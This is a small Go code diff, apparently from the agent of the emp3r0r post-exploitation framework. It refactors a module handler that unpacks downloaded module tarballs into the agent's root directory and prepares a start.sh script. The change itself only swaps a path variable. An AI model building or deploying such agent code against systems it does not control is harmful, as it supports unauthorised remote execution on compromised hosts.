@@ -17,8 +17,8 @@ import (
 )
 
 func moduleHandler(modName, checksum string) (out string) {
-	tarball := emp3r0r_data.AgentRoot + "/" + modName + ".tar.bz2"
-	modDir := emp3r0r_data.AgentRoot + "/" + modName
+	tarball := RuntimeConfig.AgentRoot + "/" + modName + ".tar.bz2"
+	modDir := RuntimeConfig.AgentRoot + "/" + modName
 	start_sh := modDir + "/start.sh"
 
 	// if we have already downloaded the module, dont bother downloading again
@@ -38,7 +38,7 @@ func moduleHandler(modName, checksum string) (out string) {
 
 	// extract files
 	os.RemoveAll(modDir)
-	if err := archiver.Unarchive(tarball, emp3r0r_data.AgentRoot); err != nil {
+	if err := archiver.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
 		return fmt.Sprintf("Unarchive module tarball: %v", err)
 	}
 
